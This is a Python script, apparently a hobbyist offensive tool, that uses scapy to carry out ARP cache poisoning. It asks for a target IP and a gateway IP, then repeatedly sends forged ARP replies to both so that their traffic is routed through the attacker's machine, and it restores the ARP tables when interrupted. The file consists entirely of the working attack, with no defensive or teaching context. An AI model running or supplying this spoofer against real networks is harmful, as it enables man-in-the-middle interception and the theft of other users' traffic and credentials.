#!/usr/bin/env python

import scapy.all as scapy
import time
import sys


class Spoofer:
    def __init__(self):
        self.arp_request = None
        self.broadcast = None
        self.answered_list = None
        self.packet = None

    def get_mac(self, ip):
        self.arp_request = scapy.ARP(pdst=ip)
        self.broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arpRequestBroadcast = self.broadcast / self.arp_request
        self.answered_list = scapy.srp(arpRequestBroadcast, timeout=1, verbose=False)[0]

        return self.answered_list[0][1].hwsrc

    def spoof(self, targetIP, spoofIP):
        targetMAC = self.get_mac(targetIP)
        self.packet = scapy.ARP(op=2, pdst=targetIP, hwdst=targetMAC, psrc=spoofIP)
        scapy.send(self.packet, verbose=False)

    def restore(self, destination_ip, source_ip):
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=self.get_mac(destination_ip), psrc=source_ip,
                           hwsrc=self.get_mac(source_ip))
        scapy.send(packet, count=4, verbose=False)


def console_print(char_pos, text):
    return text.replace(text[char_pos], text[char_pos].upper())


if __name__ == '__main__':
    targetIP = str(input("[:] Enter the TARGET IP > "))
    gatewayIP = str(input("[:] Enter the GATEWAY IP > "))

    i = 0
    line = ["\\", "/", "-", "\\", "/", "-"]

    spoof = Spoofer()

    try:
        sent_packets_count = 0
        while True:
            spoof.spoof(targetIP, gatewayIP)
            spoof.spoof(gatewayIP, targetIP)
            sent_packets_count += 2
            if i == 6:
                i = 0
            text = console_print(i, "arping")
            print("\r" + text + " " + str(line[i]) + "  [+] Packets sent: " + str(sent_packets_count)),
            sys.stdout.flush()
            i += 1
            time.sleep(2)

    except KeyboardInterrupt:
        print("\n[-] Detected CTRL + C ...")
        print("\n[↻] Resetting ARP tables ...")
        print("\n[!] Please wait ...")
        spoof.restore(targetIP, gatewayIP)
        spoof.restore(gatewayIP, targetIP)
        sys.exit(0)

    except Exception as e:
        print(f"[-] ERROR: {e}")
        sys.exit(0)
